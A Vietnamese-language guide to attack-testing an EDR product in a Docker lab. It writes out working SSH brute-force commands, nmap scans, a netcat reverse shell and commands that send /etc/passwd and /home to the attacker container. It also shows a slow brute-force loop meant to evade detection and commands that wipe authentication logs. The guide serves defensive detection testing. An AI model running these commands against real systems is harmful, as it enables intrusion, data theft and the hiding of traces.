# EDR_V2 Attack Testing Guide

## 📋 Tổng quan
Hướng dẫn này mô tả cách thiết lập và thực hiện test các cuộc tấn công thực tế lên hệ thống EDR_V2, bao gồm:
- Thiết lập môi trường tấn công
- Kết nối attacker với endpoint target  
- Thực hiện các loại tấn công
- Kiểm tra logs và detection results

## 🏗️ Kiến trúc hệ thống

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   Attacker      │    │    Target        │    │   EDR Server    │
│   Container     │────│   Container      │────│   Container     │
│                 │    │                  │    │                 │
│ - Hydra         │    │ - SSH Server     │    │ - Sigma Engine  │
│ - Nmap          │    │ - Vector Agent   │    │ - 3030+ Rules   │  
│ - Netcat        │    │ - Rsyslog        │    │ - Detection API │
│ IP: 172.19.0.4  │    │ IP: 172.19.0.2   │    │ Port: 8080      │
└─────────────────┘    └──────────────────┘    └─────────────────┘
          │                       │                       │
          └───────── edr-attack-network (172.19.0.0/16) ──┘
```

## 🚀 Khởi động hệ thống

### 1. Deploy EDR System
```bash
cd C:\Users\admin\EDR_V2\EDR_V2\deploy
docker-compose up -d
```

### 2. Tạo Attacker Container
```bash
docker run -it --name attacker-ubuntu --network edr-attack-network ubuntu:22.04 bash
```

### 3. Cài đặt Attack Tools trong Attacker Container
```bash
# Trong attacker container
apt update
apt install -y hydra nmap netcat-traditional sshpass curl wget

echo "Attack tools installed successfully!"
```

### 4. Thiết lập Target Container (SSH Server)
```bash
# Kết nối vào target container
docker exec -it deploy-ubuntu-agent-1 bash

# Cài đặt SSH server và tools
apt update
apt install -y openssh-server rsyslog

# Tạo test users
useradd -m -s /bin/bash testuser
useradd -m -s /bin/bash admin  
echo 'testuser:123456' | chpasswd
echo 'admin:password' | chpasswd

# Cấu hình SSH
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Khởi động services
mkdir -p /run/sshd
/usr/sbin/rsyslogd
/usr/sbin/sshd

echo "Target setup completed!"
```

## 🔗 Kết nối Network

### Kiểm tra IP addresses
```bash
# Kiểm tra IP của target container
docker inspect deploy-ubuntu-agent-1 | findstr IPAddress
# hoặc
docker exec deploy-ubuntu-agent-1 hostname -I

# Kiểm tra network topology
docker inspect edr-attack-network
```

### Kết nối containers vào attack network
```bash
# Nếu target container bị disconnect
docker network connect edr-attack-network deploy-ubuntu-agent-1

# Kiểm tra connectivity
docker exec attacker-ubuntu ping -c 2 172.19.0.2
```

## ⚔️ Thực hiện các cuộc tấn công

### 1. SSH Brute Force Attack
```bash
# Trong attacker container (IP: 172.19.0.4)
# Target IP: 172.19.0.2

# Tạo password list
cat > /tmp/passwords.txt << 'EOF'
admin
root
password
test
123456
letmein
welcome
EOF

# SSH Brute Force với Hydra
hydra -l testuser -P /tmp/passwords.txt ssh://172.19.0.2 -t 4 -w 3
hydra -l admin -P /tmp/passwords.txt ssh://172.19.0.2 -t 4 -w 3

# Single password test (sẽ fail)
hydra -l testuser -p wrongpass ssh://172.19.0.2 -t 1 -v
hydra -l admin -p badpass ssh://172.19.0.2 -t 1 -v

# Successful login
hydra -l testuser -p 123456 ssh://172.19.0.2 -t 1 -v
```

### 2. Network Reconnaissance  
```bash
# Port scanning
nmap -sS -p 1-1000 172.19.0.2
nmap -sV -p 22 172.19.0.2

# Service detection
nmap -sC -sV 172.19.0.2
```

### 3. Reverse Shell Attempts
```bash
# Setup listener trên attacker
nc -l -p 4444 &

# SSH vào target và thử reverse shell
sshpass -p '123456' ssh -o StrictHostKeyChecking=no testuser@172.19.0.2 \
  'bash -c "nc 172.19.0.4 4444 -e /bin/bash"'
```

### 4. Data Exfiltration
```bash
# Setup HTTP server trên attacker
python3 -m http.server 8888 &

# Exfiltrate data từ target
sshpass -p '123456' ssh -o StrictHostKeyChecking=no testuser@172.19.0.2 \
  'cat /etc/passwd | curl -X POST --data-binary @- http://172.19.0.4:8888/'
```

### 5. Privilege Escalation Attempts
```bash
# SSH vào target và thử sudo
sshpass -p '123456' ssh -o StrictHostKeyChecking=no testuser@172.19.0.2 \
  'whoami; id; sudo -l; cat /etc/passwd | head -5'
```

## 📊 Kiểm tra Detection Results

### 1. EDR Server Logs
```bash
# Xem detection logs real-time
docker logs -f deploy-edr-server-1

# Xem logs gần nhất
docker logs deploy-edr-server-1 --tail 20

# Tìm kiếm specific detections
docker logs deploy-edr-server-1 | findstr "DETECT"
```

### 2. Target Container Logs
```bash
# Kiểm tra SSH authentication logs
docker exec deploy-ubuntu-agent-1 cat /var/log/auth.log | tail -10

# Kiểm tra failed login attempts  
docker exec deploy-ubuntu-agent-1 lastb -n 20

# Kiểm tra successful logins
docker exec deploy-ubuntu-agent-1 last -n 10

# Kiểm tra system logs
docker exec deploy-ubuntu-agent-1 cat /var/log/syslog | tail -10
```

### 3. Vector Agent Status
```bash
# Kiểm tra Vector agent logs
docker logs deploy-ubuntu-agent-1 --tail 10

# Kiểm tra Vector configuration
docker exec deploy-ubuntu-agent-1 cat /etc/vector/vector.toml
```

## 🔍 Monitoring và Debugging

### Kiểm tra Service Status
```bash
# Trong target container
ps aux | grep -E "(ssh|rsyslog|vector)"
netstat -tln | grep :22  # SSH port
lsof -i :22             # SSH connections
```

### Network Connectivity Tests
```bash
# Test từ attacker
docker exec attacker-ubuntu ping -c 2 172.19.0.2
docker exec attacker-ubuntu telnet 172.19.0.2 22

# Test SSH connection
docker exec attacker-ubuntu ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
  testuser@172.19.0.2 'echo "SSH works!"'
```

### EDR Detection Verification
```bash
# Kiểm tra số lượng events được xử lý
docker logs deploy-edr-server-1 | findstr "accepted="

# Kiểm tra detection rate
docker logs deploy-edr-server-1 | findstr "matched="

# Xem chi tiết events được detect
docker logs deploy-edr-server-1 | findstr "DETECT idx="
```

## 📈 Expected Results

### Successful Attack Detection
Khi tấn công thành công, bạn sẽ thấy:

```
2025/09/11 10:55:37 DETECT idx=0 rules=[1fc0809e-06bf-4de3-ad52-25e5263b7623] event=ssh connection attempt
2025/09/11 10:55:37 DETECT idx=1 rules=[1fc0809e-06bf-4de3-ad52-25e5263b7623] event=ssh connection attempt  
2025/09/11 10:55:37 /ingest accepted=8 matched=8 errors=0
```

### Target Logs
```
admin    ssh:notty    172.19.0.4       Thu Sep 11 10:55 - 10:55  (00:00)
testuser ssh:notty    172.19.0.4       Thu Sep 11 10:55 - 10:55  (00:00)
Sep 11 10:55:21 target sshd[1787]: Accepted password for testuser from 172.19.0.4
```

## 🚨 Troubleshooting

### Container Network Issues
```bash
# Reconnect containers to network
docker network connect edr-attack-network deploy-ubuntu-agent-1
docker network connect edr-attack-network attacker-ubuntu

# Check network connectivity
docker network inspect edr-attack-network
```

### SSH Service Issues
```bash
# Restart SSH in target
docker exec deploy-ubuntu-agent-1 bash -c "
mkdir -p /run/sshd
pkill sshd
/usr/sbin/sshd
"
```

### Vector Agent Issues
```bash
# Restart Vector agent
docker-compose restart ubuntu-agent

# Check Vector config syntax
docker exec deploy-ubuntu-agent-1 vector validate /etc/vector/vector.toml
```

## 🎯 Advanced Testing Scenarios

### Multiple Concurrent Attacks
```bash
# Parallel brute force
hydra -L /tmp/userlist.txt -P /tmp/passwords.txt ssh://172.19.0.2 -t 8 &
nmap -sS 172.19.0.2 &
nc -l -p 5555 &
```

### Custom Attack Patterns
```bash
# Slow brute force to evade detection
for user in testuser admin root; do
  for pass in password 123456 admin; do
    echo "Trying $user:$pass"
    sshpass -p "$pass" ssh -o ConnectTimeout=3 "$user@172.19.0.2" exit
    sleep 2
  done
done
```

### Attack Chain Simulation
```bash
# 1. Reconnaissance
nmap -sV 172.19.0.2

# 2. Brute force
hydra -l testuser -p 123456 ssh://172.19.0.2

# 3. Lateral movement 
sshpass -p '123456' ssh testuser@172.19.0.2 'cat /etc/passwd'

# 4. Data exfiltration
sshpass -p '123456' ssh testuser@172.19.0.2 'tar czf - /home' | nc 172.19.0.4 6666
```

## 📝 Best Practices

1. **Always verify network connectivity** trước khi attack
2. **Monitor EDR logs real-time** trong quá trình test  
3. **Document attack vectors** và detection results
4. **Clean up logs** giữa các test sessions
5. **Test multiple attack patterns** để verify coverage

## 🔄 Reset Environment
```bash
# Reset target container
docker-compose restart ubuntu-agent

# Clear logs
docker exec deploy-ubuntu-agent-1 bash -c "
> /var/log/auth.log
> /var/log/syslog  
> /var/log/btmp
> /var/log/wtmp
"

# Restart EDR server
docker-compose restart edr-server
```

---

**📊 Detection Rate Goal: 100%**  
**🎯 Mission: Verify EDR_V2 can detect real-world attacks**
